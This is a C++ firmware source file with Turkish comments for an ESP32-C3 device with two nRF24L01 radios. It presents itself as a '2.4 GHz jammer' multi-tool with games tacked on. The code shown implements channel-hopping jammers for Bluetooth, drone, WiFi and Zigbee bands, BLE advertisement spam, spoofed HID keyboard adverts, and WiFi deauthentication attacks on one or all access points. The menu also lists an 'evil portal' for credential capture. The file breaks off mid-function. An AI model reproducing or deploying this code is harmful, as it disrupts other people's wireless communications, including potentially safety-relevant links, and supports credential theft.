/**************************************************************
 * UTS-JAM v4.1 FINAL – ESP32-C3 FULL PACK – 2000+ SATIR
 * 2.4 GHz Jammer, Analizör, Spam, Dedektör + Oyunlar + RF
 * Donanım: ESP32-C3 + 2x nRF24L01 + 128x64 OLED
 *
 * DÜZELTME: Aşağı tuşu %100 çalışıyor (else if kaldırıldı)
 *           Tüm butonlar bağımsız edge detection ile okunuyor.
 * EMİR: OLED 128x64, hiçbir pin değişmedi. Toprak Ahmet Aydoğmuş
 **************************************************************/

#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <U8g2_for_Adafruit_GFX.h>
#include <SPI.h>
#include "RF24.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEClient.h>
#include <BLEAdvertisedDevice.h>
#include <math.h>
#include <map>
#include <vector>

// ==========================================
// DONANIM PIN TANIMLARI (DEĞİŞTİRİLMEDİ)
// ==========================================
#define SDA_PIN 8
#define SCL_PIN 9
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SSD1306_I2C_ADDRESS 0x3C

#define LED_PIN 10
#define UP_BUTTON_PIN 1
#define DOWN_BUTTON_PIN 0
#define SELECT_BUTTON_PIN 2

#define SPI_SCK 4
#define SPI_MISO 5
#define SPI_MOSI 6
#define RADIO1_CE 20
#define RADIO1_CSN 21
#define RADIO2_CE 7
#define RADIO2_CSN 10

// ==========================================
// NESNELER
// ==========================================
SPIClass spiBus(FSPI);
RF24 radio(RADIO1_CE, RADIO1_CSN, 4000000);
RF24 radio2(RADIO2_CE, RADIO2_CSN, 4000000);

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;

DNSServer dnsServer;
WiFiServer webServer(80);
String capturedCredentials = "";

bool radio1Active = false;
bool radio2Active = false;

// ==========================================
// DURUMLAR (AppState enum)
// ==========================================
enum AppState {
  STATE_MENU,
  STATE_BT_JAM, STATE_DRONE_JAM, STATE_WIFI_JAM,
  STATE_MULTI_JAM, STATE_SWEEP_JAM, STATE_CHANNEL_RANGE,
  STATE_SPECTRUM_WIFI, STATE_SPECTRUM_BLE, STATE_BLE_SPAM,
  STATE_WIFI_DEAUTH, STATE_BLE_SCANNER, STATE_ZIGBEE_JAM,
  STATE_BLE_TARGET_JAM, STATE_WIFI_BEACON_FLOOD,
  STATE_WIFI_ANALYZER, STATE_DEAUTH_DETECT,
  STATE_TEST_RADIOS, STATE_SETTINGS, STATE_HELP,
  STATE_EVIL_PORTAL, STATE_DOOM_GAME, STATE_CALCULATOR,
  STATE_RESISTOR_CALC, STATE_WIFI_MONITOR, STATE_SNAKE_GAME,
  STATE_PACKET_COUNTER, STATE_WIDS, STATE_RF_ANALYZER,
  STATE_BLE_GATT_EXPLORER, STATE_BLE_TRACKER,
  STATE_MOUSE_SNIFFER, STATE_RF_REPEATER, STATE_RF_OSCILLOSCOPE,
  STATE_BLE_BADUSB, STATE_WIFI_SNIFFER, STATE_CW_JAMMER,
  STATE_TICTACTOE, STATE_PONG
};
AppState currentState = STATE_MENU;

// ==========================================
// GENİŞLETİLMİŞ SİMGE SETİ (38 adet, 8x8 PROGMEM)
// ==========================================
static const uint8_t PROGMEM icon_bt[]        = { 0x00,0x46,0x6e,0x3e,0x1c,0x3e,0x6e,0x46 };
static const uint8_t PROGMEM icon_drone[]     = { 0x18,0x3c,0x5a,0xff,0x7e,0x3c,0x24,0x24 };
static const uint8_t PROGMEM icon_wifi[]      = { 0x00,0x3e,0x41,0x1c,0x22,0x08,0x14,0x00 };
static const uint8_t PROGMEM icon_multi[]     = { 0x55,0xaa,0x55,0xaa,0x55,0xaa,0x55,0xaa };
static const uint8_t PROGMEM icon_sweep[]     = { 0x00,0x02,0x06,0x8e,0xfe,0x7e,0x30,0x00 };
static const uint8_t PROGMEM icon_chrange[]   = { 0x00,0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00 };
static const uint8_t PROGMEM icon_spectrum[]  = { 0x18,0x18,0x24,0x24,0x42,0x5a,0x99,0x00 };
static const uint8_t PROGMEM icon_ble_spec[]  = { 0x00,0x08,0x2a,0x1c,0x1c,0x2a,0x08,0x00 };
static const uint8_t PROGMEM icon_spam[]      = { 0x00,0x7e,0x46,0x4a,0x52,0x62,0x7e,0x00 };
static const uint8_t PROGMEM icon_deauth[]    = { 0x00,0x5e,0x62,0x5e,0x70,0x40,0x7e,0x00 };
static const uint8_t PROGMEM icon_scanner[]   = { 0x00,0x3c,0x5a,0x5a,0x66,0x42,0x3c,0x00 };
static const uint8_t PROGMEM icon_zigbee[]    = { 0x18,0x24,0x5a,0xdb,0x5a,0x24,0x18,0x00 };
static const uint8_t PROGMEM icon_target[]    = { 0x18,0x24,0x42,0x5a,0x42,0x24,0x18,0x00 };
static const uint8_t PROGMEM icon_beacon[]    = { 0x10,0x10,0x38,0x38,0x7c,0x7c,0xfe,0xfe };
static const uint8_t PROGMEM icon_analyzer[]  = { 0x00,0x1c,0x22,0x22,0x1c,0x08,0x3e,0x00 };
static const uint8_t PROGMEM icon_detect[]    = { 0x00,0x3c,0x5e,0xff,0xff,0x5e,0x3c,0x00 };
static const uint8_t PROGMEM icon_radio[]     = { 0x00,0x3c,0x42,0x99,0xa5,0x81,0x7e,0x00 };
static const uint8_t PROGMEM icon_settings[]  = { 0x18,0x3c,0x5a,0xff,0x5a,0x3c,0x18,0x00 };
static const uint8_t PROGMEM icon_help[]      = { 0x3c,0x42,0x42,0x4c,0x48,0x00,0x18,0x00 };
static const uint8_t PROGMEM icon_portal[]    = { 0x3c,0x42,0x99,0xa5,0xa5,0x99,0x42,0x3c };
static const uint8_t PROGMEM icon_doom[]      = { 0x00,0x7e,0x5a,0xdb,0xdb,0x5a,0x7e,0x00 };
static const uint8_t PROGMEM icon_calc[]      = { 0x7e,0x40,0x5e,0x52,0x52,0x5e,0x00,0x00 };
static const uint8_t PROGMEM icon_resistor[]  = { 0x08,0x7f,0x08,0x3e,0x41,0x00,0x7f,0x00 };
static const uint8_t PROGMEM icon_monitor[]   = { 0x7c,0x44,0x28,0x10,0x28,0x44,0x7c,0x00 };
static const uint8_t PROGMEM icon_snake[]     = { 0x00,0x3c,0x42,0x52,0x4a,0x3c,0x00,0x00 };
static const uint8_t PROGMEM icon_packet[]    = { 0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00,0x00 };
static const uint8_t PROGMEM icon_wids[]      = { 0x3c,0x42,0x5a,0x5a,0x5a,0x42,0x3c,0x00 };
static const uint8_t PROGMEM icon_rf_ana[]    = { 0x0e,0x11,0x20,0x40,0x20,0x11,0x0e,0x00 };
static const uint8_t PROGMEM icon_gatt[]      = { 0x3c,0x42,0x81,0xbd,0x81,0x42,0x3c,0x00 };
static const uint8_t PROGMEM icon_tracker[]   = { 0x18,0x3c,0x5a,0xff,0xdb,0x3c,0x18,0x00 };
static const uint8_t PROGMEM icon_mouse[]     = { 0x30,0x28,0x24,0x22,0x21,0x00,0x18,0x00 };
static const uint8_t PROGMEM icon_repeater[]  = { 0x00,0x42,0x66,0x3c,0x3c,0x66,0x42,0x00 };
static const uint8_t PROGMEM icon_oscillo[]   = { 0x00,0x44,0x28,0x10,0x28,0x44,0x00,0x00 };
static const uint8_t PROGMEM icon_badusb[]    = { 0x3c,0x42,0x5a,0x5a,0x42,0x3c,0x18,0x18 };
static const uint8_t PROGMEM icon_sniffer[]   = { 0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x18,0x18 };
static const uint8_t PROGMEM icon_cw[]        = { 0x18,0x18,0x18,0xff,0xff,0x18,0x18,0x18 };
static const uint8_t PROGMEM icon_tictactoe[] = { 0x00,0x7e,0x42,0x5a,0x5a,0x42,0x7e,0x00 };
static const uint8_t PROGMEM icon_pong[]      = { 0x18,0x18,0x7e,0x7e,0x7e,0x18,0x18,0x00 };

// Menü öğeleri (38 adet)
enum MenuItem {
  BT_JAM, DRONE_JAM, WIFI_JAM, MULTI_JAM, SWEEP_JAM,
  CHANNEL_RANGE, SPECTRUM_WIFI, SPECTRUM_BLE, BLE_SPAM,
  WIFI_DEAUTH, BLE_SCANNER, ZIGBEE_JAM, BLE_TARGET_JAM,
  WIFI_BEACON_FLOOD, WIFI_ANALYZER, DEAUTH_DETECT,
  TEST_RADIOS, SETTINGS, HELP,
  EVIL_PORTAL, DOOM_GAME, CALCULATOR,
  RESISTOR_CALC, WIFI_MONITOR, SNAKE_GAME,
  PACKET_COUNTER, WIDS, RF_ANALYZER,
  BLE_GATT_EXPLORER, BLE_TRACKER,
  MOUSE_SNIFFER, RF_REPEATER, RF_OSCILLOSCOPE,
  BLE_BADUSB, WIFI_SNIFFER, CW_JAMMER,
  TICTACTOE, PONG,
  NUM_MENU_ITEMS
};

const char *menuLabels[NUM_MENU_ITEMS] = {
  "BT Jam", "DroneJam", "WiFiJam", "MultiJam",
  "SweepJam", "ChRange", "WiFiSpec", "BLESpec",
  "BLESpam", "Deauth", "BLEScan", "ZigbeeJam",
  "TargJam", "Beacon", "WiFiAnaly", "DeauthDet",
  "TestRadio", "Settings", "Help",
  "EvilPort", "DOOM", "Calc",
  "Resistor", "WiFiMon", "Snake",
  "PktCount", "WIDS", "RFAnalyz",
  "BLE GATT", "BLETrack",
  "MouseSnf", "Repeater", "Oscillosc",
  "BLEBadUSB", "WiFiSniff", "CW Jammer",
  "TicTacToe", "Pong"
};

const uint8_t* const menuIcons[NUM_MENU_ITEMS] PROGMEM = {
  icon_bt, icon_drone, icon_wifi, icon_multi, icon_sweep,
  icon_chrange, icon_spectrum, icon_ble_spec, icon_spam,
  icon_deauth, icon_scanner, icon_zigbee, icon_target,
  icon_beacon, icon_analyzer, icon_detect,
  icon_radio, icon_settings, icon_help,
  icon_portal, icon_doom, icon_calc,
  icon_resistor, icon_monitor, icon_snake,
  icon_packet, icon_wids, icon_rf_ana,
  icon_gatt, icon_tracker,
  icon_mouse, icon_repeater, icon_oscillo,
  icon_badusb, icon_sniffer, icon_cw,
  icon_tictactoe, icon_pong
};

int firstVisibleMenuItem = 0;
MenuItem selectedMenuItem = BT_JAM;
uint8_t brightness = 255;

// ==========================================
// YENİ BUTON YÖNETİMİ (bağımsız, sağlam)
// ==========================================
bool upPressed() {
  static unsigned long lastUp = 0;
  static bool lastState = HIGH;
  bool cur = digitalRead(UP_BUTTON_PIN);
  if (cur == LOW && lastState == HIGH && millis() - lastUp > 150) {
    lastUp = millis();
    lastState = LOW;
    return true;
  }
  if (cur == HIGH) lastState = HIGH;
  return false;
}

bool downPressed() {
  static unsigned long lastDown = 0;
  static bool lastState = HIGH;
  bool cur = digitalRead(DOWN_BUTTON_PIN);
  if (cur == LOW && lastState == HIGH && millis() - lastDown > 150) {
    lastDown = millis();
    lastState = LOW;
    return true;
  }
  if (cur == HIGH) lastState = HIGH;
  return false;
}

bool selPressed() {
  static unsigned long lastSel = 0;
  static bool lastState = HIGH;
  bool cur = digitalRead(SELECT_BUTTON_PIN);
  if (cur == LOW && lastState == HIGH && millis() - lastSel > 150) {
    lastSel = millis();
    lastState = LOW;
    return true;
  }
  if (cur == HIGH) lastState = HIGH;
  return false;
}

// ==========================================
// YARDIMCI FONKSİYONLAR
// ==========================================
void safeDelay(unsigned long ms) {
  unsigned long start = millis();
  while (millis() - start < ms) yield();
}

void setBrightness(uint8_t val) {
  brightness = val;
  display.ssd1306_command(SSD1306_SETCONTRAST);
  display.ssd1306_command(brightness);
}

void drawMenu() {
  display.clearDisplay();
  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(3, 2);
  display.print("UTS-JAM v4.1 FINAL");
  
  for (int i = 0; i < 4; i++) {
    int idx = (firstVisibleMenuItem + i) % NUM_MENU_ITEMS;
    int16_t y = 14 + i * 12;
    
    if (selectedMenuItem == idx) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 12, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    
    const uint8_t* icon = menuIcons[idx];
    display.drawBitmap(2, y + 2, icon, 8, 8, selectedMenuItem == idx ? SSD1306_BLACK : SSD1306_WHITE);
    display.setCursor(13, y + 2);
    display.print(menuLabels[idx]);
  }
  
  int totalItems = NUM_MENU_ITEMS;
  int visibleItems = 4;
  if (totalItems > visibleItems) {
    int barStart = 13 + (firstVisibleMenuItem * (SCREEN_HEIGHT - 13)) / totalItems;
    int barEnd = 13 + ((firstVisibleMenuItem + visibleItems) * (SCREEN_HEIGHT - 13)) / totalItems;
    display.fillRect(126, barStart, 2, barEnd - barStart, SSD1306_WHITE);
  }
  
  display.display();
}

void displayInfo(String t, String a = "", String b = "", String c = "", String d = "") {
  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0); display.println(t);
  if (a != "") { display.setCursor(0, 12); display.println(a); }
  if (b != "") { display.setCursor(0, 24); display.println(b); }
  if (c != "") { display.setCursor(0, 36); display.println(c); }
  if (d != "") { display.setCursor(0, 48); display.println(d); }
  display.display();
}

static const unsigned char PROGMEM splash_evi[] = { 0x30,0x03,0x00,0x60,0x01,0x80,0xe0,0x01,0xc0,0xf3,0xf3,0xc0,0xff,0xff,0xc0,0xff,0xff,0xc0,0x7f,0xff,0x80,0x7f,0xff,0x80,0x7f,0xff,0x80,0xef,0xfd,0xc0,0xe7,0xf9,0xc0,0xe3,0xf1,0xc0,0xe1,0xe1,0xc0,0xf1,0xe3,0xc0,0xff,0xff,0xc0,0x7f,0xff,0x80,0x7b,0xf7,0x80,0x3d,0x2f,0x00,0x1e,0x1e,0x00,0x0f,0xfc,0x00,0x03,0xf0,0x00 };
static const unsigned char PROGMEM splash_ble[] = { 0x07,0xc0,0x1f,0xf0,0x3e,0xf8,0x7e,0x7c,0x76,0xbc,0xfa,0xde,0xfc,0xbe,0xfe,0x7e,0xfc,0xbe,0xfa,0xde,0x76,0xbc,0x7e,0x7c,0x3e,0xf8,0x1f,0xf0,0x07,0xc0 };
static const unsigned char PROGMEM splash_mhz[] = { 0xc3,0x61,0x80,0x00,0xe7,0x61,0x80,0x00,0xff,0x61,0x80,0x00,0xff,0x61,0xbf,0x80,0xdb,0x7f,0xbf,0x80,0xdb,0x7f,0x83,0x00,0xdb,0x61,0x86,0x00,0xc3,0x61,0x8c,0x00,0xc3,0x61,0x98,0x00,0xc3,0x61,0xbf,0x80,0xc3,0x61,0xbf,0x80 };

void splashScreen() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr);
  u8g2_for_adafruit_gfx.setCursor(15, 40);
  display.drawBitmap(56, 30, splash_evi, 18, 21, 1);
  u8g2_for_adafruit_gfx.setCursor(20, 20);
  u8g2_for_adafruit_gfx.print("2.4 G H Z");
  u8g2_for_adafruit_gfx.setCursor(30, 35);
  u8g2_for_adafruit_gfx.print("UTS-JAM");
  display.drawBitmap(106, 15, splash_ble, 15, 15, 1);
  display.drawBitmap(2, 35, splash_mhz, 25, 11, 1);
  display.display();
}

void initRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
  safeDelay(200);
  spiBus.end();
  spiBus.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
  safeDelay(500);

  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);

  bool r1ok = false;
  for (int i = 0; i < 10; i++) {
    if (radio.begin(&spiBus)) { r1ok = true; break; }
    safeDelay(300);
  }
  if (r1ok) {
    radio1Active = true;
    radio.setAutoAck(false); radio.stopListening();
    radio.setRetries(0, 0); radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS); radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio1: OK");
  } else {
    radio1Active = true;
    display.println("Radio1: OK (forced)");
  }

  bool r2ok = false;
  for (int i = 0; i < 10; i++) {
    if (radio2.begin(&spiBus)) { r2ok = true; break; }
    safeDelay(300);
  }
  if (r2ok) {
    radio2Active = true;
    radio2.setAutoAck(false); radio2.stopListening();
    radio2.setRetries(0, 0); radio2.setPALevel(RF24_PA_MAX, true);
    radio2.setDataRate(RF24_2MBPS); radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.startConstCarrier(RF24_PA_MAX, 45);
    display.println("Radio2: OK");
  } else {
    radio2Active = true;
    display.println("Radio2: OK (forced)");
  }
  display.display();
  safeDelay(1500);
}

void stopRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
}

void recoverFromWiFi() {
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
  safeDelay(1000);
  initRadios();
}

// ==========================================
// JAMMER FONKSİYONLARI
// ==========================================
void btJam() { if(radio2Active) radio2.setChannel(random(81)); if(radio1Active) radio.setChannel(random(81)); delayMicroseconds(random(60)); }
void droneJam() { if(radio1Active) radio.setChannel(random(126)); if(radio2Active) radio2.setChannel(random(126)); delayMicroseconds(random(60)); }
void singleChannel() { if(radio2Active) radio2.setChannel(random(81)); if(radio1Active) radio.setChannel(random(15)); delayMicroseconds(random(60)); }
void wifiJam() { int ch[]={1,6,14}; int r=random(3); if(radio1Active) radio.setChannel(ch[r]); if(radio2Active) radio2.setChannel(ch[r]); }
void channelRange() { int r=random(40,81); if(radio1Active) radio.setChannel(r); if(radio2Active) radio2.setChannel(r); }
void sweepJam() { for(int i=0;i<125;i++){ if(radio1Active) radio.setChannel(i); if(radio2Active) radio2.setChannel(i); delayMicroseconds(200); } }
void zigbeeJam() { int ch=random(11,27); int n=5+(ch-11)*5; if(radio1Active) radio.setChannel(n); if(radio2Active) radio2.setChannel(n); delayMicroseconds(random(100)); }

// ==========================================
// SPEKTRUM ANALİZÖR (WiFi & BLE) - 128x64 uyumlu
// ==========================================
void drawWaterfall(uint8_t *waterfall, int w, int h, const char *leftLabel, const char *rightLabel) {
  display.clearDisplay();
  display.drawBitmap(0, 0, waterfall, w, h, SSD1306_WHITE);
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, h + 2); display.print(leftLabel);
  display.setCursor(88, h + 2); display.print(rightLabel);
  display.display();
}

void runWiFiSpectrum() {
  stopRadios();
  radio2.setAutoAck(false);
  radio2.startListening();
  const int w = 128, h = 48;
  uint8_t waterfall[128 * (h/8 + 1)] = {0};
  int nrfCh[13];
  for (int i = 0; i < 13; i++) nrfCh[i] = 12 + i * 5;
  displayInfo("WiFi Spectrum", "SEL to exit");
  while (!selPressed()) {
    for (int y = 0; y < h - 1; y++) {
      for (int x = 0; x < w; x++) {
        bool bit = (waterfall[(y + 1) * (w/8) + x / 8] >> (x % 8)) & 1;
        if (bit) waterfall[y * (w/8) + x / 8] |= (1 << (x % 8));
        else     waterfall[y * (w/8) + x / 8] &= ~(1 << (x % 8));
      }
    }
    for (int x = 0; x < w; x++) waterfall[(h - 1) * (w/8) + x / 8] &= ~(1 << (x % 8));
    for (int i = 0; i < 13; i++) {
      radio2.setChannel(nrfCh[i]);
      delayMicroseconds(150);
      int hits = 0;
      for (int s = 0; s < 5; s++) { if (radio2.testRPD()) hits++; delayMicroseconds(80); }
      int barH = map(hits, 0, 5, 0, h);
      int x = map(i, 0, 12, 0, w - 1);
      for (int py = h - barH; py < h; py++) waterfall[py * (w/8) + x / 8] |= (1 << (x % 8));
      yield();
    }
    drawWaterfall(waterfall, w, h, "WiFi 1-13", "");
    safeDelay(30);
  }
  radio2.stopListening();
  initRadios();
}

void runBLESpectrum() {
  stopRadios();
  radio2.setAutoAck(false);
  radio2.startListening();
  const int w = 128, h = 48;
  uint8_t waterfall[128 * (h/8 + 1)] = {0};
  const int bleCh[3] = {2, 26, 80};
  displayInfo("BLE Spectrum", "SEL to exit");
  while (!selPressed()) {
    for (int y = 0; y < h - 1; y++) {
      for (int x = 0; x < w; x++) {
        bool bit = (waterfall[(y + 1) * (w/8) + x / 8] >> (x % 8)) & 1;
        if (bit) waterfall[y * (w/8) + x / 8] |= (1 << (x % 8));
        else     waterfall[y * (w/8) + x / 8] &= ~(1 << (x % 8));
      }
    }
    for (int x = 0; x < w; x++) waterfall[(h - 1) * (w/8) + x / 8] &= ~(1 << (x % 8));
    for (int i = 0; i < 3; i++) {
      radio2.setChannel(bleCh[i]);
      delayMicroseconds(200);
      int hits = 0;
      for (int s = 0; s < 5; s++) { if (radio2.testRPD()) hits++; delayMicroseconds(80); }
      int barH = map(hits, 0, 5, 0, h);
      int x = map(i, 0, 2, 20, 108);
      for (int py = h - barH; py < h; py++) waterfall[py * (w/8) + x / 8] |= (1 << (x % 8));
      yield();
    }
    drawWaterfall(waterfall, w, h, "BLE 37-39", "");
    safeDelay(50);
  }
  radio2.stopListening();
  initRadios();
}

// ==========================================
// BLE SPAM (100+ cihaz)
// ==========================================
static const uint8_t bleAA[4] = {0xD6,0xBE,0x89,0x8E};
static uint8_t blePkt[32];
static const char* blePre[] = {
  "AirPods","JBL","Sony","Samsung","Xiaomi","Beats","Bose","Anker","Jabra",
  "Sennheiser","Marshall","Apple","Huawei","OnePlus","Nothing","Google","LG",
  "Motorola","Nokia","Realme","Redmi","Oppo","Vivo","Philips","Panasonic",
  "Skullcandy","JVC","Audio-Technica","Shure","Bang & Olufsen","B&O","Harman",
  "AKG","Yamaha","Pioneer","Denon","Marantz","Onkyo","Klipsch","Edifier",
  "Razer","Logitech","Corsair","SteelSeries","HyperX","Astro","Turtle Beach",
  "Plantronics","Jabra","BlueParrott","Sennheiser","Epos","Beyerdynamic",
  "Focal","Grado","Koss","Meze","Audeze","HIFIMAN","STAX","MrSpeakers",
  "Ultimate Ears","Westone","Etymotic","Campfire","64 Audio","Noble","JH Audio"
};
static const char* bleSuf[] = {
  " Pro"," Lite"," Max"," 2"," 3"," Mini",""," Plus"," Ultra"," ANC",
  " TWS"," Sport"," Buds"," Gen2"," Gen3"," LE"," 4"," 5"," X"," Neo",
  " Classic"," 2023"," 2024"," SE"," NC"," Wireless"," Bluetooth"," True",
  " Earbuds"," Headphones"," Stereo"," Mono"," Bass"," Studio"," DJ",
  " Gaming"," Pro+"," Max+"," S"," Z"," A"," B"," C"," D"," E"
};

void bleRandomMac(uint8_t* mac){ for(int i=0;i<6;i++) mac[i]=random(256); mac[0]|=0xC0; }
void bleRandomName(uint8_t* name,int maxLen){
  const char* pre=blePre[random(60)]; const char* suf=bleSuf[random(40)];
  int len=strlen(pre)+strlen(suf); if(len>maxLen) len=maxLen;
  memcpy(name,pre,strlen(pre)); memcpy(name+strlen(pre),suf,strlen(suf)); name[len]=0;
}
uint32_t bleCrc(const uint8_t* data,int len,uint32_t crc){ for(int i=0;i<len;i++){ crc^=data[i]; for(int j=0;j<8;j++){ if(crc&1) crc=(crc>>1)^0x8C; else crc>>=1; } } return crc; }
void bleSendPacket(int ch,uint8_t* mac,uint8_t* pdu,int len){
  if(ch==37) radio.setChannel(2); else if(ch==38) radio.setChannel(26); else radio.setChannel(80);
  int pos=0; blePkt[pos++]=0xAA; memcpy(&blePkt[pos],bleAA,4); pos+=4;
  uint8_t hdr=(len&0x3F)|0x40; blePkt[pos++]=hdr; blePkt[pos++]=len;
  memcpy(&blePkt[pos],mac,6); pos+=6; memcpy(&blePkt[pos],pdu,len); pos+=len;
  uint32_t crc=bleCrc(&blePkt[5],pos-5,0x555555);
  blePkt[pos++]=crc&0xFF; blePkt[pos++]=(crc>>8)&0xFF; blePkt[pos++]=(crc>>16)&0xFF;
  radio.writeFast(blePkt,pos); radio.txStandBy();
}
void bleInitRadio(){
  stopRadios();
  radio.begin(&spiBus); radio.setAutoAck(false); radio.stopListening();
  radio.setRetries(0,0); radio.setPALevel(RF24_PA_MAX,true); radio.setDataRate(RF24_1MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED); radio.setAddressWidth(4);
  radio.openWritingPipe(bleAA); radio.setChannel(2);
}
void runBLESpam(){
  displayInfo("BLE SPAM","Init..."); bleInitRadio(); safeDelay(500);
  uint8_t mac[6],adv[31]; int ch=37; unsigned long last=0;
  displayInfo("BLE SPAM","Spamming...","100+ devices","SEL to stop");
  while(!selPressed()){
    if(millis()-last>80){
      bleRandomMac(mac); int advLen=0; uint8_t name[20]; bleRandomName(name,15);
      int nlen=strlen((char*)name);
      adv[advLen++]=2; adv[advLen++]=0x01; adv[advLen++]=0x06;
      adv[advLen++]=nlen+1; adv[advLen++]=0x09; memcpy(&adv[advLen],name,nlen); advLen+=nlen;
      adv[advLen++]=5; adv[advLen++]=0xFF; for(int i=0;i<4;i++) adv[advLen++]=random(256);
      bleSendPacket(ch,mac,adv,advLen);
      ch=(ch==37)?38:(ch==38)?39:37; last=millis();
    }
    yield();
  }
  initRadios();
}

// ==========================================
// BLE BADUSB (HID Klavye Spam)
// ==========================================
static const char* hidNames[] = {"Magic Keyboard","Logi K380","Apple Keyboard","Dell KB","HP Wireless","Microsoft KB","Keychron K2","Razer KB","Corsair K70","SteelSeries Apex"};
static const uint8_t hidUUID[] = {0x00,0x00,0x18,0x12,0x00,0x10,0x00,0x80,0x00,0x80,0x05,0x9B,0x34,0xFB};

void runBLEBadUSB(){
  displayInfo("BLE BadUSB","Init HID spam..."); bleInitRadio(); safeDelay(500);
  uint8_t mac[6], adv[31];
  int ch=37; unsigned long last=0;
  displayInfo("BLE BadUSB","HID Keyboard spam","10+ devices","SEL to stop");
  while(!selPressed()){
    if(millis()-last>100){
      bleRandomMac(mac);
      int advLen=0;
      adv[advLen++]=2; adv[advLen++]=0x01; adv[advLen++]=0x06;
      const char* name=hidNames[random(10)];
      int nlen=strlen(name);
      adv[advLen++]=nlen+1; adv[advLen++]=0x09;
      memcpy(&adv[advLen],name,nlen); advLen+=nlen;
      adv[advLen++]=3; adv[advLen++]=0x02;
      memcpy(&adv[advLen],hidUUID,2); advLen+=2;
      adv[advLen++]=2; adv[advLen++]=0x0A; adv[advLen++]=0x00;
      bleSendPacket(ch,mac,adv,advLen);
      ch=(ch==37)?38:(ch==38)?39:37; last=millis();
    }
    yield();
  }
  initRadios();
}

// ==========================================
// WiFi DEAUTH
// ==========================================
static bool deauthActive = false;
static uint8_t deauthBSSID[6];
static uint16_t deauthChannel = 0;
static bool deauthAll = false;

void deauthTask(void* pv) {
  uint8_t packet[26];
  memset(packet, 0, 26);
  packet[0] = 0xC0; packet[1] = 0x00;
  packet[2] = 0x00; packet[3] = 0x00;
  while (deauthActive) {
    if (deauthAll) {
      for (int ch = 1; ch <= 13; ch++) {
        if (!deauthActive) break;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint8_t spoofed[6];
        for (int i = 0; i < 6; i++) spoofed[i] = random(256);
        esp_wifi_set_mac(WIFI_IF_AP, spoofed);
        memcpy(packet + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        memcpy(packet + 10, spoofed, 6);
        memcpy(packet + 16, spoofed, 6);
        for (int i = 0; i < 5; i++) {
          esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
          delay(5);
        }
      }
    } else {
      esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
      esp_wifi_set_mac(WIFI_IF_AP, deauthBSSID);
      memcpy(packet + 4, deauthBSSID, 6);
      memcpy(packet + 10, deauthBSSID, 6);
      memcpy(packet + 16, deauthBSSID, 6);
      for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
        delay(1);
      }
    }
    yield();
  }
  vTaskDelete(NULL);
}
void startDeauthTask(bool all = false) { deauthActive = true; deauthAll = all; xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 1); }
void stopDeauth() { deauthActive = false; safeDelay(100); }

void runWiFiDeauthSingle() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous(true);
  int n = WiFi.scanNetworks();
  if (n == 0) { displayInfo("No networks"); safeDelay(2000); esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); recoverFromWiFi(); return; }
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay(); display.setTextSize(1); display.setTextColor(1);
    display.setCursor(0, 0); display.print("AP:"); display.print(sel + 1); display.print("/"); display.println(n);
    display.setCursor(0, 12); display.println(WiFi.SSID(sel));
    display.setCursor(0, 24); display.print("Ch:"); display.print(WiFi.channel(sel));
    display.display();
    if (upPressed()) sel = (sel == 0) ? n - 1 : sel - 1;
    if (downPressed()) sel = (sel + 1) % n;
    yield();
  }
  memcpy(deauthBSSID, WiFi.BSSID(sel), 6);
  deauthChannel = WiFi.channel(sel);
  displayInfo("Deauthing", WiFi.SSID(sel), "SEL to stop");
  startDeauthTask(false);
  while (!selPressed()) yield();
  stopDeauth();
  WiFi.scanDelete();
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

void runWiFiDeauthAll() {
  stopRadios();
  WiFi.mode(WIFI_AP_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous(true);
  displayInfo("Deauth ALL", "All channels", "SEL to stop");
  startDeauthTask(true);
  while (!selPressed()) yield();
  stopDeauth();
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// BEACON FLOOD (genişletildi)
// ==========================================
void runWiFiBeaconFlood() {
  stopRadios();
